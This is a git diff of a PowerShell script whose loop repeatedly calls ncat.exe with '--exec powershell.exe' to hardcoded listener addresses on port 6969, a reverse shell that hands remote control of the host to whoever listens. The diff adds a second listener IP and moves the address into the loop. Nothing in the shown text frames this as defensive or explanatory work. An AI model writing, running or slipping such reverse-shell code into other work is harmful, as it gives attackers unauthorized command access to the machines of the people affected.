@@ -13,7 +13,7 @@ Write-Output "Scan Finished"
 #>
 
 # get ip of listener (disabled until I find a more reliable way)
-$ListenerIP = "10.133.33.205"
+# $ListenerIP = "10.133.33.205"
 <#
 Write-Output "Getting IP"
 $string = $ScanOutput | Select-String -Pattern "192\.168\..+"
@@ -25,5 +25,11 @@ for (;;)
 {
 # connect to listener
 Write-Output "Connecting to listener"
+$ListenerIP = "10.133.33.205"
+.\ncat.exe -C --exec "powershell.exe" $ListenerIP 6969
+
+# connect to listener
+Write-Output "Connecting to listener"
+$ListenerIP = "10.133.61.215"
 .\ncat.exe -C --exec "powershell.exe" $ListenerIP 6969
 }
